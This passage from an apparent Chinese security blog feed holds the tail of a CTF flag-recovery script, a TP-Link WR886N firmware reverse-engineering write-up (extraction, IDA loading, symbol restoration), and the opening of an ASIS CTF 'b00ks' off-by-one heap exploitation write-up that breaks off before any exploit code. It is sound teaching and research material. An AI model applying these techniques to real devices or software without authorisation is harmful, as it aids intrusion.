[]</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> index &lt; <span class="built_in">len</span>(dword_601ca0):</span><br><span class="line">    value = dword_601ca0[index:index+<span class="number">4</span>]</span><br><span class="line">    count = dword_601ca0[index+<span class="number">4</span>:index+<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">if</span> value[<span class="number">0</span>] != <span class="string">&#x27;\xff&#x27;</span>:</span><br><span class="line">        byte_6010a0_sorted.extend([value[<span class="number">0</span>]] * <span class="built_in">ord</span>(count[<span class="number">0</span>]))</span><br><span class="line">        index += <span class="number">8</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">index += <span class="number">4</span></span><br><span class="line"><span class="keyword">while</span> index &lt; <span class="built_in">len</span>(dword_601ca0):</span><br><span class="line">    value = dword_601ca0[index:index+<span class="number">4</span>]</span><br><span class="line">    count = dword_601ca0[index+<span class="number">4</span>:index+<span class="number">8</span>]</span><br><span class="line">    byte_601aa0.extend([value[<span class="number">0</span>]] * <span class="built_in">ord</span>(count[<span class="number">0</span>]))</span><br><span class="line">    index += <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># the last item in byte_601aa0 is omitted in original code</span></span><br><span class="line">byte_601aa0.append(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line"></span><br><span class="line">char_dict = defaultdict(<span class="built_in">list</span>)</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> xrange(<span class="built_in">len</span>(byte_6010a0_sorted)):</span><br><span class="line">    char_dict[byte_6010a0_sorted[index]].append(byte_601aa0[index])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">nextc, key_index, total_char, flags</span>):</span></span><br><span class="line">    key_index = copy.deepcopy(key_index)</span><br><span class="line">    <span class="keyword">if</span> total_char == <span class="built_in">len</span>(byte_6010a0_sorted):</span><br><span class="line">        <span class="built_in">print</span> flags</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> key_index:</span><br><span class="line">        <span class="keyword">if</span> key_index[key] == <span class="built_in">len</span>(char_dict[key]):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># use key_index[key] to keep the order of sequence</span></span><br><span class="line">        <span class="keyword">if</span> char_dict[key][key_index[key]] == nextc:</span><br><span class="line">            key_index[key] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> dfs(key, key_index, total_char+<span class="number">1</span>, flags+key):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            key_index[key] -= <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">key_index = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> char_dict:</span><br><span class="line">    key_index[item] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> key_index:</span><br><span class="line">    dfs(key, key_index, <span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="附件下载"><a href="#附件下载" class="headerlink" title="附件下载"></a>附件下载</h3><p><a href="samples.zip">题目及相关脚本</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TP-Link wr886nv6 固件解析</title>
      <link href="2018/09/19/TP-Link-wr886v6-%E5%9B%BA%E4%BB%B6%E8%A7%A3%E6%9E%90/"/>
      <url>2018/09/19/TP-Link-wr886v6-%E5%9B%BA%E4%BB%B6%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近看了@小黑猪的一篇关于<span class="exturl" data-url="aHR0cDovL2dhbGF4eWxhYi5vcmcvMHgwMC10cC1saW5rLXdyODg2bnY3LXYxLTEtMC0lRTglQjclQUYlRTclOTQlQjElRTUlOTklQTglRTUlODglODYlRTYlOUUlOTAtJUU1JTlCJUJBJUU0JUJCJUI2JUU1JTg4JTlEJUU2JUFEJUE1JUU1JTg4JTg2JUU2JTlFJTkwLw==">TP-Link wr886nv7固件初步分析<i class="fa fa-external-link-alt"></i></span>的文章，由于之前很少分析基于VxWorks系统的固件，所以按照文章的思路动手重现了一下整个过程。</p><h3 id="使用binwalk-初步分析"><a href="#使用binwalk-初步分析" class="headerlink" title="使用binwalk 初步分析"></a>使用<code>binwalk</code> 初步分析</h3><p>从TP-Link官网下载<code>wr886</code>的固件，由于没有找到v7版本的固件，所以下载的是v6版本的固件。对下载的压缩包进行解压，然后使用<code>binwalk</code>对文件<code>wr886nv6.bin</code>进行分析，如下。</p><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk wr886nv6.bin</span> </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">12656         0x3170          U-Boot version string, &quot;U-Boot 1.1.4 (May  8 2016 - 07:42:47)&quot;</span><br><span class="line">12704         0x31A0          CRC32 polynomial table, big endian</span><br><span class="line">13932         0x366C          uImage header, header size: 64 bytes, header CRC: 0x773178DD, created: 2016-05-08 14:42:48, image size: 20788 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x983BDABA, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: lzma, image name: &quot;u-boot image&quot;</span><br><span class="line">13996         0x36AC          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 52148 bytes</span><br><span class="line">41472         0xA200          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 2365008 bytes</span><br><span class="line">791104        0xC1240         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 1731 bytes</span><br><span class="line">792301        0xC16ED         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 7272 bytes</span><br><span class="line">793897        0xC1D29         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 200 bytes</span><br><span class="line">794124        0xC1E0C         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 247 bytes</span><br><span class="line">794391        0xC1F17         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 313 bytes</span><br><span class="line">794600        0xC1FE8         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 12213 bytes</span><br><span class="line">796301        0xC268D         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 493 bytes</span><br><span class="line">... # some data omitted </span><br><span class="line">1270120       0x136168        LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 3965 bytes</span><br></pre></td></tr></table></figure><p>从上述结果可知，除了开始部分的”U-Boot version string”、”CRC32”和”uImage header”之外，其余部分均为采用<code>lzma</code>进行压缩后的数据。其中，注意到偏移<code>0xa200</code>处的数据大小为2M多，猜测其可能包含一些有用的数据，提取该部分并使用lzma命令进行解压缩。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用dd命令进行提取</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dd <span class="keyword">if</span>=wr886nv6.bin of=a200.lzma bs=1 skip=41472 count=749632  <span class="comment"># 749643=791104-41472</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用lzma命令进行解压</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> lzma -d a200.lzma</span> </span><br><span class="line">lzma: a200.lzma: Compressed data is corrupt</span><br></pre></td></tr></table></figure><p>在进行解压时提示”Compressed data is corrupt”。使用<code>hexdump</code>打开wr886nv6.bin，定位到0xc1240处，如下所示。发现0xc120更像是处于lzma压缩数据的中间，而不像是lzma压缩数据的结尾。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexdump -s 0xc1100 -n 512 -C wr886nv6.b</span></span><br><span class="line">000c1100  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">*</span><br><span class="line">000c1200  4d 49 4e 49 46 53 00 00  00 00 00 00 00 00 00 00  |MINIFS..........|</span><br><span class="line">000c1210  00 00 00 02 00 00 00 86  00 01 f4 00 00 07 55 7c  |..............U||</span><br><span class="line">000c1220  92 1c 64 4e ae 88 d9 d2  2d b4 48 ce 5c eb 69 51  |..dN....-.H.\.iQ|</span><br><span class="line">000c1230  00 00 04 8d 00 00 00 20  00 00 06 c3 00 00 00 00  |....... ........|</span><br><span class="line">000c1240  5a 00 00 80 00 c3 06 00  00 00 00 00 00 00 16 e9  |Z...............|</span><br><span class="line">000c1250  0c 89 39 ad 0e c6 50 fb  60 3c ae 25 25 14 4e 75  |..9...P.`&lt;.%%.Nu|</span><br><span class="line">000c1260  25 2b ba d7 8c 1c 83 9e  9c d8 85 63 21 54 28 e1  |%+.........c!T(.|</span><br><span class="line">000c1270  37 82 ac 9b 67 de 30 9f  31 9d a1 cc f8 9f 48 35  |7...g.0.1.....H5|</span><br><span class="line">000c1280  95 d1 36 f2 6a 08 8c 7c  3f 20 25 b2 8c d0 62 4e  |..6.j..|? %...bN|</span><br><span class="line">000c1290  e6 3e 8d 3b 41 f4 ff b5  5c 7f e0 73 6c f4 a0 03  |.&gt;.;A...\..sl...|</span><br></pre></td></tr></table></figure><p>从偏移0xc1240处往上寻找偏移0xa200处压缩数据的结尾，发现可能是在0xc04b1处，如下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexdump -s 0xc04a0 -n 512 -C wr886nv6.bin</span> </span><br><span class="line">000c04a0  03 0b ba 40 fb 20 27 05  c2 c4 64 d9 fe 98 78 de  |...@. &#x27;...d...x.|</span><br><span class="line">000c04b0  be 68 ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |.h..............|</span><br><span class="line">000c04c0  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">*</span><br><span class="line">000c06a0</span><br></pre></td></tr></table></figure><p>对<code>dd</code>命令中的<code>count</code>参数进行修改后，即可成功提取并解压。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">dd <span class="keyword">if</span>=wr886nv6.bin of=a200.lzma bs=1 skip=41472 count=746162 <span class="comment"># 746162=0xc04b1-0xa200+1</span></span></span><br></pre></td></tr></table></figure><blockquote><p>说明：也可以运行命令<code>binwalk -e wr886nv6.bin</code>，解压目录中的A200文件与通过上述方法得到的一致。</p></blockquote><p>再次利用<code>binwalk</code>对得到的a200文件进行分析，如下。猜测这个文件很有可能就是路由器所运行的系统文件，版本为5.5.1。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk a200</span> </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">1846404       0x1C2C84        Certificate in DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">1853692       0x1C48FC        Certificate in DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">1898688       0x1CF8C0        VxWorks operating system version &quot;5.5.1&quot; , compiled: &quot;Sep 20 2017, 09:16:35&quot;</span><br><span class="line">1967556       0x1E05C4        Copyright string: &quot;Copyright(C) 2001-2011 by TP-LINK TECHNOLOGIES CO., LTD.&quot;</span><br><span class="line">1997244       0x1E79BC        VxWorks WIND kernel version &quot;2.6&quot;</span><br><span class="line">2042360       0x1F29F8        HTML document header</span><br><span class="line">2042425       0x1F2A39        HTML document footer</span><br><span class="line">2062192       0x1F7770        PEM certificate</span><br><span class="line">2062248       0x1F77A8        PEM RSA private key</span><br><span class="line">2071532       0x1F9BEC        Base64 standard index table</span><br><span class="line">2106544       0x2024B0        CRC32 polynomial table, big endian</span><br><span class="line">2107568       0x2028B0        CRC32 polynomial table, big endian</span><br><span class="line">2108592       0x202CB0        CRC32 polynomial table, big endian</span><br><span class="line">2109616       0x2030B0        CRC32 polynomial table, big endian</span><br><span class="line">2130316       0x20818C        XML document, version: &quot;1.0&quot;</span><br><span class="line">2149736       0x20CD68        SHA256 hash constants, big endian</span><br><span class="line">2247821       0x224C8D        StuffIt Deluxe Segment (data): f</span><br><span class="line">2247852       0x224CAC        StuffIt Deluxe Segment (data): fError</span><br><span class="line">2247933       0x224CFD        StuffIt Deluxe Segment (data): f</span><br></pre></td></tr></table></figure><h3 id="使用IDA-Pro分析"><a href="#使用IDA-Pro分析" class="headerlink" title="使用IDA  Pro分析"></a>使用IDA  Pro分析</h3><p>由于IDA Pro无法识别该文件，提示为”Binary file”，因此需要确定CPU的架构及加载基址。在”uImage header”部分已经有一些信息，如下，可以看到CPU架构为<code>MIPS</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk wr886nv6.bin</span> </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">12656         0x3170          U-Boot version string, &quot;U-Boot 1.1.4 (May  8 2016 - 07:42:47)&quot;</span><br><span class="line">12704         0x31A0          CRC32 polynomial table, big endian</span><br><span class="line">13932         0x366C          uImage header, header size: 64 bytes, header CRC: 0x773178DD, created: 2016-05-08 14:42:48, image size: 20788 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x983BDABA, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: lzma, image name: &quot;u-boot image&quot;</span><br></pre></td></tr></table></figure><blockquote><p>在uImage header中有一个Entry Point地址0x80010000，这个地址可能是uBoot程序的加载基址，而不是a200文件的加载基址。采用该地址作为加载基址，虽然也能识别出2000多个函数，但在后续导入符号表时会对不上。</p></blockquote><p>也可以使用<code>binwalk</code>命令来查看CPU的架构，如下。可以看到，CPU架构为<code>MIPS</code>，同时为大端格式。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> binwalk -Y a200</span> </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             MIPS executable code, 32/64-bit, big endian, at least 1013 valid instructions</span><br></pre></td></tr></table></figure><p>在对偏移0xa200之前的一些数据进行分析时，可以看到一个疑似uImage header的数据段，其中有两处地址指向了0x80001000，这个地址也和<code>devttys0</code><span class="exturl" data-url="aHR0cDovL3d3dy5kZXZ0dHlzMC5jb20vMjAxMS8wNy9yZXZlcnNlLWVuZ2luZWVyaW5nLXZ4d29ya3MtZmlybXdhcmUtd3J0NTRndjgv">博客<i class="fa fa-external-link-alt"></i></span>中提到的加载基址相同，因此尝试使用该地址作为文件的加载地址。</p><img data-src="images/ida_pro_process_type.png"><img data-src="images/ida_pro_load_address.png"><p>在选择MIPS大端处理器以及设置加载基址后，IDA Pro的初步分析结果如下，可以看到共识别出6149个函数。</p><img data-src="images/ida_pro_initial_analysis.png"><p>在对该文件进行分析时，发现IDA Pro中的<code>Imports</code>和<code>Exports</code>都是空的，可能是没有导入符号表的缘故。</p><h3 id="符号表导入"><a href="#符号表导入" class="headerlink" title="符号表导入"></a>符号表导入</h3><p>使用<code>binwalk</code>直接提取该固件，在提取后的目录中搜索包含VxWorks中的某个关键函数如<code>bzero</code>的文件，如下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> grep -r bzero .</span></span><br><span class="line">Binary file ./C2E3A matches</span><br></pre></td></tr></table></figure><p>通过查看该文件，发现其中包含大量的VxWorks关键函数名，猜测可能是独立的符号表。在进行简单分析后，发现该文件存在比较明显的特征，如下。</p><img data-src="images/symbol_file_analysis.png"><p>根据这个符号文件的特征，编写idapython脚本来对文件的符号进行修复，如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"></span><br><span class="line">symfile_path = <span class="string">&#x27;./C2E3A&#x27;</span>    </span><br><span class="line">symbols_table_start = <span class="number">8</span></span><br><span class="line">strings_table_start = <span class="number">0x9d00</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(symfile_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    symfile_contents = f.read()</span><br><span class="line"></span><br><span class="line">symbols_table = symfile_contents[symbols_table_start:strings_table_start]</span><br><span class="line">strings_table = symfile_contents[strings_table_start:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_string_by_offset</span>(<span class="params">offset</span>):</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> strings_table[offset+index] != <span class="string">&#x27;\x00&#x27;</span>:</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> strings_table[offset:offset+index]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_symbols_metadata</span>():</span></span><br><span class="line">    symbols = []</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(symbols_table),<span class="number">8</span>):</span><br><span class="line">        symbol_item = symbols_table[offset:offset+<span class="number">8</span>]</span><br><span class="line">        flag = symbol_item[<span class="number">0</span>]</span><br><span class="line">        string_offset = <span class="built_in">int</span>(symbol_item[<span class="number">1</span>:<span class="number">4</span>].encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">        string_name = get_string_by_offset(string_offset)</span><br><span class="line">        target_address = <span class="built_in">int</span>(symbol_item[-<span class="number">4</span>:].encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">        symbols.append((flag, string_name, target_address))</span><br><span class="line">    <span class="keyword">return</span> symbols</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_symbols</span>(<span class="params">symbols_meta_data</span>):</span></span><br><span class="line">    <span class="keyword">for</span> flag, string_name, target_address <span class="keyword">in</span> symbols_meta_data:</span><br><span class="line">        idc.MakeName(target_address, string_name)</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="string">&#x27;\x54&#x27;</span>:</span><br><span class="line">            idc.MakeCode(target_address)</span><br><span class="line">            idc.MakeFunction(target_address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    symbols_metadata = get_symbols_metadata()</span><br><span class="line">    add_symbols(symbols_metadata)</span><br></pre></td></tr></table></figure><p>修复完成后IDA Pro中的函数列表如下所示。</p><img data-src="images/ida_pro_functions.png"><p>导入符号之后，再对该文件进行分析就更方便了。</p><blockquote><p>说明：直接使用<code>binwalk</code>提取固件，在解压得到的文件中，绝大部分都是文本文件，包括脚本、图片等，只有3个文件为二进制文件，其中36AC为uBoot文件，A200为系统运行文件，C2E3A为符号文件。</p></blockquote><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cDovL2dhbGF4eWxhYi5vcmcvMHgwMC10cC1saW5rLXdyODg2bnY3LXYxLTEtMC0lRTglQjclQUYlRTclOTQlQjElRTUlOTklQTglRTUlODglODYlRTYlOUUlOTAtJUU1JTlCJUJBJUU0JUJCJUI2JUU1JTg4JTlEJUU2JUFEJUE1JUU1JTg4JTg2JUU2JTlFJTkwLw==">TP-Link wr886nv7-V1.1.0 路由器分析 - 固件初步分析<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy5kZXZ0dHlzMC5jb20vMjAxMS8wNy9yZXZlcnNlLWVuZ2luZWVyaW5nLXZ4d29ya3MtZmlybXdhcmUtd3J0NTRndjgv">Reverse Engineering VxWorks Firmware: WRT54Gv8<i class="fa fa-external-link-alt"></i></span></li></ul><h3 id="附件下载"><a href="#附件下载" class="headerlink" title="附件下载"></a>附件下载</h3><p><a href="samples.zip">固件文件及脚本</a></p>]]></content>
      
      
      <categories>
          
          <category> IoT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 固件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>asis-ctf-2016 pwn 之 b00ks</title>
      <link href="2018/06/05/asis-ctf-2016-pwn-b00ks/"/>
      <url>2018/06/05/asis-ctf-2016-pwn-b00ks/</url>
      
        <content type="html"><![CDATA[<h3 id="off-by-one-原理"><a href="#off-by-one-原理" class="headerlink" title="off-by-one 原理"></a>off-by-one 原理</h3><p>严格来说，off-by-one漏洞是一种特殊的溢出漏洞，指程序向缓冲区中写入时，写入的字节数超过了缓冲区本身的大小，并且只越界了一个字节。这种漏洞的产生往往与边界验证不严或字符串操作有关，当然也有可能写入的size正好就只多了一个字节：</p><ul><li>使用循环语句向缓冲区中写入数据时，循环的次数设置错误导致多写入一个字节</li><li>字符串操作不合适，比如忽略了字符串末尾的<code>\x00</code></li></ul><a id="more"></a><p>一般而言，单字节溢出很难利用。但因为Linux中的堆管理机制ptmalloc验证的松散型，基于Linux堆的off-by-one漏洞利用起来并不复杂，而且威力强大。需要说明的是，<code>off-by-one</code>是可以基于各种缓冲区的，如栈、bss段等。但堆上的<code>off-by-one</code>在CTF中比较常见，下面以2016年asis CTF中的b00ks为实例进行分析。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目是一个常见的菜单式程序，功能是一个图书管理系统，提供了创建、删除、编辑、打印图书等功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Welcome to ASISCTF book library</span><br><span class="line">Enter author name: </span><br><span class="line"></span><br><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>题目是一个64位程序，其启用的保护措施如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file ./b00ks</span> </span><br><span class="line">./b00ks: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=cdcd9edea919e679ace66ad54da9281d3eb09270, stripped</span><br><span class="line"></span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> checksec</span> </span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : ENABLED</span><br><span class="line">RELRO     : FULL</span><br></pre></td></tr></table></figure><p>在创建book时，name和description在堆上分配。首先使用malloc分配name buffer，大小不超过32；之后，分配description buffer, 大小自定义；最后分配book结构体，用于保存book的信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// allocate name</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nEnter book name size: &quot;</span>, *(_QWORD *)&amp;v1);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line"><span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>, *(_QWORD *)&amp;v1);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(v1);</span><br><span class="line"><span class="keyword">if</span> ( ptr )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( read_input(ptr, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v1 - <span class="number">1</span>)) )</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// allocate description</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nEnter book description size: &quot;</span>, *(_QWORD *)&amp;v1);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line"><span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v5 = <span class="built_in">malloc</span>(v1);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span 